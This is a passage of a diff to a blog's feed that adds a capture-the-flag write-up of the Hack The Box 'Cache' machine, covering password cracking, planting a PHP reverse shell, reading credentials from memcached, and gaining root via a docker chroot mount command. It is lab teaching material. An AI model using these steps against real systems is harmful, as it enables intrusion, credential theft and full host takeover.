+Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
+Session completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Now we can login with this username and password.&lt;/p&gt;
+
+&lt;h3 id=&quot;getting-shell-1&quot;&gt;Getting Shell&lt;/h3&gt;
+&lt;p&gt;After enumerating the site I found the file management system in the &lt;code class=&quot;highlighter-rouge&quot;&gt;Adminitration &amp;gt; Files&lt;/code&gt; tab, which contained few php scripts. I changed one of the php files to my reverse shell script
+&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/488628d9-e734-4b28-8418-aa193d66182ecac/config.png&quot; alt=&quot;Uploading script&quot; /&gt;
+and then called the script with the command&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://hms.htb/sites/default/config.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Which gave me a shell back as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt;
+&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/488628d9-e734-4b28-8418-aa193d66182ecac/www-data.png&quot; alt=&quot;Reverse shell&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;There’s a simple way to do this using a python script exploit available on DB-exploit, but it shouldn’t be used as it sets everything back to default state (which, for HMS, is turning off patient portal which we used initially. So, nobody else could use it now!)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;lateral-movement&quot;&gt;Lateral Movement&lt;/h2&gt;
+&lt;p&gt;Now we need to escalate our privileges a bit atleast. I ran netstat to check the local ports with the command:&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@cache:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;netstat &lt;span class=&quot;nt&quot;&gt;-tulp&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/488628d9-e734-4b28-8418-aa193d66182ecac/netstat.png&quot; alt=&quot;Netstat ports&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There’s a MySQL port open on 3306 and an unknown high port open at &lt;strong&gt;11211&lt;/strong&gt;. A quick google search told me that it is used by &lt;strong&gt;memcached&lt;/strong&gt; service (another machine-matching name, I love that. Lol!). So I searched how to access its info and did the following steps to get creds stored in the cachedump service in memcached.&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;telnet localhost 11211
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/488628d9-e734-4b28-8418-aa193d66182ecac/telnet1.png&quot; alt=&quot;Telnet memcached&quot; /&gt;
+This told me that there are a few items stored in some of the keys. So, I checked the cachedump for keys and then look at the values stored in them.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/488628d9-e734-4b28-8418-aa193d66182ecac/telnet_pass.png&quot; alt=&quot;Memcached keys&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I got another username and password which I tried with SSH and got logged in as user &lt;strong&gt;luffy&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;getting-root&quot;&gt;Getting Root&lt;/h2&gt;
+&lt;p&gt;Unfortunately, this user doesn’t give us flag, checking the /home folder tells us that user &lt;strong&gt;Ash&lt;/strong&gt; might be having it. But there was one interesting thing that I got with the very first command I perform upon getting a shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/488628d9-e734-4b28-8418-aa193d66182ecac/docker_group.png&quot; alt=&quot;Docker group&quot; /&gt;
+We are in the Docker group! So there must be some Docker images present as well. But first, I went to &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt; to check if there’s a way to break out of restricted shell using docker, and there was!&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker run &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /:/mnt &lt;span class=&quot;nt&quot;&gt;--rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-it&lt;/span&gt; &amp;lt;image&amp;gt; chroot /mnt sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And then I checked what all images are present and found an Ubuntu image in the system.
+&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/488628d9-e734-4b28-8418-aa193d66182ecac/docker_ls.png&quot; alt=&quot;Docker image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So I ran the command&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;luffy@cache:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker run &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /:/mnt &lt;span class=&quot;nt&quot;&gt;--rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ti&lt;/span&gt; ubuntu chroot /mnt bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;And got root!
+&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/488628d9-e734-4b28-8418-aa193d66182ecac/root.png&quot; alt=&quot;Docker root&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;PS: If you did some other way, and got user Ash first, please let me know!&lt;/p&gt;
+
+&lt;hr /&gt;</content><category term="cache" /><category term="ctf" /><category term="linux" /><category term="htb" /><category term="hackthebox" /><category term="write-up" /><category term="nmap" /><category term="devtools" /><category term="domain fuzzing" /><category term="cewl" /><category term="custom wordlist" /><category term="wfuzz" /><category term="openemr" /><category term="sql injection" /><category term="burpsuite" /><category term="sqlmap" /><category term="john" /><category term="php" /><category term="reverse shell" /><category term="curl" /><category term="netstat" /><category term="memcached" /><category term="telnet" /><category term="docker" /><category term="GTFOBins" /><summary>Medium-level Linux machine</summary></entry><entry><title>“Quick” Write-up</title><link href="https://xmehulx.github.io/write-ups/quick/" rel="alternate" type="text/html" title="&quot;**Quick**&quot; Write-up" /><published>2020-05-12T00:00:00+05:30</published><updated>2020-05-12T00:00:00+05:30</updated><id>https://xmehulx.github.io/write-ups/quick</id><content type="html" xml:base="https://xmehulx.github.io/write-ups/quick/">&lt;figure&gt;
         &lt;img style=&quot;border-radius:10px&quot; src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/info.png&quot; /&gt;
 &lt;/figure&gt;
 
@@ -274,7 +546,7 @@ Command: &lt;span class=&quot;nt&quot;&gt;&amp;lt;xsl:value-of&lt;/span&gt; &lt;
 
 &lt;p&gt;PS: If you noticed the change in IP in some of the pictures, I got bored and started playing DotA for couple of days before continuing this write-up again.&lt;/p&gt;
 
-&lt;hr /&gt;</content><category term="quick" /><category term="ctf" /><category term="linux" /><category term="htb" /><category term="hackthebox" /><category term="write-up" /><category term="nmap" /><category term="gobuster" /><category term="http/3" /><category term="quiche" /><category term="wfuzz" /><category term="esigate" /><category term="burp" /><category term="curl" /><category term="xslt" /><category term="mysql" /><category term="netcat" /><category term="nc" /><category term="php" /><category term="md5" /><category term="custom script" /><category term="race condition" /><category term="symlink" /><category term="encoding" /><summary>Hard-level Linux machine</summary></entry><entry><title>“Admirer” Write-up</title><link href="https://xmehulx.github.io/write-ups/admirer/" rel="alternate" type="text/html" title="&quot;**Admirer**&quot; Write-up" /><published>2020-05-06T00:00:00-04:00</published><updated>2020-05-06T00:00:00-04:00</updated><id>https://xmehulx.github.io/write-ups/admirer</id><content type="html" xml:base="https://xmehulx.github.io/write-ups/admirer/">&lt;figure&gt;
+&lt;hr /&gt;</content><category term="quick" /><category term="ctf" /><category term="linux" /><category term="htb" /><category term="hackthebox" /><category term="write-up" /><category term="nmap" /><category term="gobuster" /><category term="http/3" /><category term="quiche" /><category term="wfuzz" /><category term="esigate" /><category term="burp" /><category term="curl" /><category term="xslt" /><category term="mysql" /><category term="netcat" /><category term="nc" /><category term="php" /><category term="md5" /><category term="custom script" /><category term="race condition" /><category term="symlink" /><category term="encoding" /><summary>Hard-level Linux machine</summary></entry><entry><title>“Admirer” Write-up</title><link href="https://xmehulx.github.io/write-ups/admirer/" rel="alternate" type="text/html" title="&quot;**Admirer**&quot; Write-up" /><published>2020-05-06T00:00:00+05:30</published><updated>2020-05-06T00:00:00+05:30</updated><id>https://xmehulx.github.io/write-ups/admirer</id><content type="html" xml:base="https://xmehulx.github.io/write-ups/admirer/">&lt;figure&gt;
         &lt;img style=&quot;border-radius:10px&quot; src=&quot;https://xmehulx.github.io/write-ups/images/machines/4b83c688-be1d-4211-b1fc-4cd28e62fd14adm/info.png&quot; /&gt;
 &lt;/figure&gt;
 
@@ -424,7 +696,7 @@ fields terminated by '\n'
 &lt;figure&gt;
         &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/4b83c688-be1d-4211-b1fc-4cd28e62fd14adm/root_shell.png&quot; /&gt;
 &lt;/figure&gt;
-&lt;hr /&gt;</content><category term="remote" /><category term="ctf" /><category term="linux" /><category term="hackthebox" /><category term="htb" /><category term="write-up" /><category term="robots.txt" /><category term="gobuster" /><category term="FTP" /><category term="python path hijacking" /><category term="adminer vulnerability" /><category term="sql" /><category term="nmap" /><category term="reverse shell" /><summary>Easy-level Linux machine</summary></entry><entry><title>“OpenAdmin” Write-up</title><link href="https://xmehulx.github.io/write-ups/openadmin/" rel="alternate" type="text/html" title="&quot;**OpenAdmin**&quot; Write-up" /><published>2020-05-02T00:00:00-04:00</published><updated>2020-05-02T00:00:00-04:00</updated><id>https://xmehulx.github.io/write-ups/openadmin</id><content type="html" xml:base="https://xmehulx.github.io/write-ups/openadmin/">&lt;figure&gt;
+&lt;hr /&gt;</content><category term="remote" /><category term="ctf" /><category term="linux" /><category term="hackthebox" /><category term="htb" /><category term="write-up" /><category term="robots.txt" /><category term="gobuster" /><category term="FTP" /><category term="python path hijacking" /><category term="adminer vulnerability" /><category term="sql" /><category term="nmap" /><category term="reverse shell" /><summary>Easy-level Linux machine</summary></entry><entry><title>“OpenAdmin” Write-up</title><link href="https://xmehulx.github.io/write-ups/openadmin/" rel="alternate" type="text/html" title="&quot;**OpenAdmin**&quot; Write-up" /><published>2020-05-02T00:00:00+05:30</published><updated>2020-05-02T00:00:00+05:30</updated><id>https://xmehulx.github.io/write-ups/openadmin</id><content type="html" xml:base="https://xmehulx.github.io/write-ups/openadmin/">&lt;figure&gt;
 	&lt;img style=&quot;border-radius:10px&quot; src=&quot;https://xmehulx.github.io/write-ups/images/machines/cb9732a2-90f5-11ea-bb37-0242ac130002oad/info.png&quot; /&gt;
 &lt;/figure&gt;
 
@@ -475,7 +747,7 @@ fields terminated by '\n'
 &lt;figure&gt;
 	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/cb9732a2-90f5-11ea-bb37-0242ac130002oad/root.png&quot; /&gt;
 &lt;/figure&gt;
-&lt;hr /&gt;</content><category term="servmon" /><category term="ctf" /><category term="windows" /><category term="htb" /><category term="hackthebox" /><category term="write-up" /><category term="opennetadmin" /><category term="john" /><category term="rsa" /><category term="nmap" /><category term="sudo" /><category term="netstat" /><category term="ssh" /><summary>Easy-level Windows machine</summary></entry><entry><title>“Magic” Write-up</title><link href="https://xmehulx.github.io/write-ups/magic/" rel="alternate" type="text/html" title="&quot;**Magic**&quot; Write-up" /><published>2020-04-22T00:00:00-04:00</published><updated>2020-04-22T00:00:00-04:00</updated><id>https://xmehulx.github.io/write-ups/magic</id><content type="html" xml:base="https://xmehulx.github.io/write-ups/magic/">&lt;figure&gt;
+&lt;hr /&gt;</content><category term="servmon" /><category term="ctf" /><category term="windows" /><category term="htb" /><category term="hackthebox" /><category term="write-up" /><category term="opennetadmin" /><category term="john" /><category term="rsa" /><category term="nmap" /><category term="sudo" /><category term="netstat" /><category term="ssh" /><summary>Easy-level Windows machine</summary></entry><entry><title>“Magic” Write-up</title><link href="https://xmehulx.github.io/write-ups/magic/" rel="alternate" type="text/html" title="&quot;**Magic**&quot; Write-up" /><published>2020-04-22T00:00:00+05:30</published><updated>2020-04-22T00:00:00+05:30</updated><id>https://xmehulx.github.io/write-ups/magic</id><content type="html" xml:base="https://xmehulx.github.io/write-ups/magic/">&lt;figure&gt;
         &lt;img style=&quot;border-radius:10px&quot; src=&quot;https://xmehulx.github.io/write-ups/images/machines/cf8ad3e3-42aa-4e65-9715-b1e13b678b6fmag/info.png&quot; /&gt;
 &lt;/figure&gt;
 
@@ -561,7 +833,7 @@ fields terminated by '\n'
 
 &lt;p&gt;PS: There is a &lt;strong&gt;C file&lt;/strong&gt; in the root folder to see what are the other 3 commands &lt;code class=&quot;highlighter-rouge&quot;&gt;sysinfo&lt;/code&gt; uses to give output.&lt;/p&gt;
 
-&lt;hr /&gt;</content><category term="magic" /><category term="ctf" /><category term="linux" /><category term="htb" /><category term="hackthebox" /><category term="write-up" /><category term="nmap" /><category term="sql" /><category term="hexdump" /><category term="reverse shell" /><category term="sysinfo" /><category term="free" /><category term="lshw" /><category term="png header" /><category term="file upload" /><summary>Medium-level Linux machine</summary></entry><entry><title>“Mango” Write-up</title><link href="https://xmehulx.github.io/write-ups/mango/" rel="alternate" type="text/html" title="&quot;**Mango**&quot; Write-up" /><published>2020-04-01T00:00:00-04:00</published><updated>2020-04-01T00:00:00-04:00</updated><id>https://xmehulx.github.io/write-ups/mango</id><content type="html" xml:base="https://xmehulx.github.io/write-ups/mango/">&lt;figure&gt;
+&lt;hr /&gt;</content><category term="magic" /><category term="ctf" /><category term="linux" /><category term="htb" /><category term="hackthebox" /><category term="write-up" /><category term="nmap" /><category term="sql" /><category term="hexdump" /><category term="reverse shell" /><category term="sysinfo" /><category term="free" /><category term="lshw" /><category term="png header" /><category term="file upload" /><summary>Medium-level Linux machine</summary></entry><entry><title>“Mango” Write-up</title><link href="https://xmehulx.github.io/write-ups/mango/" rel="alternate" type="text/html" title="&quot;**Mango**&quot; Write-up" /><published>2020-04-01T00:00:00+05:30</published><updated>2020-04-01T00:00:00+05:30</updated><id>https://xmehulx.github.io/write-ups/mango</id><content type="html" xml:base="https://xmehulx.github.io/write-ups/mango/">&lt;figure&gt;
 	&lt;img style=&quot;border-radius:10px&quot; src=&quot;https://xmehulx.github.io/write-ups/images/machines/0f63ba28-2c2d-4e55-af7a-db4870ad469eman/mango.png&quot; /&gt;
 &lt;/figure&gt;
 
@@ -618,7 +890,7 @@ fields terminated by '\n'
 &lt;figure&gt;
 	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/0f63ba28-2c2d-4e55-af7a-db4870ad469eman/root.png&quot; /&gt;
 &lt;/figure&gt;
-&lt;hr /&gt;</content><category term="mango" /><category term="ctf" /><category term="linux" /><category term="htb" /><category term="hackthebox" /><category term="write-up" /><summary>Medium-level Linux machine</summary></entry><entry><title>“Traceback” Write-up</title><link href="https://xmehulx.github.io/write-ups/traceback/" rel="alternate" type="text/html" title="&quot;**Traceback**&quot; Write-up" /><published>2020-02-22T00:00:00-05:00</published><updated>2020-02-22T00:00:00-05:00</updated><id>https://xmehulx.github.io/write-ups/traceback</id><content type="html" xml:base="https://xmehulx.github.io/write-ups/traceback/">&lt;figure&gt;
+&lt;hr /&gt;</content><category term="mango" /><category term="ctf" /><category term="linux" /><category term="htb" /><category term="hackthebox" /><category term="write-up" /><summary>Medium-level Linux machine</summary></entry><entry><title>“Traceback” Write-up</title><link href="https://xmehulx.github.io/write-ups/traceback/" rel="alternate" type="text/html" title="&quot;**Traceback**&quot; Write-up" /><published>2020-02-22T00:00:00+05:30</published><updated>2020-02-22T00:00:00+05:30</updated><id>https://xmehulx.github.io/write-ups/traceback</id><content type="html" xml:base="https://xmehulx.github.io/write-ups/traceback/">&lt;figure&gt;
         &lt;img style=&quot;border-radius:10px&quot; src=&quot;../images/machines/traceback/info.png&quot; /&gt;
 &lt;/figure&gt;
 
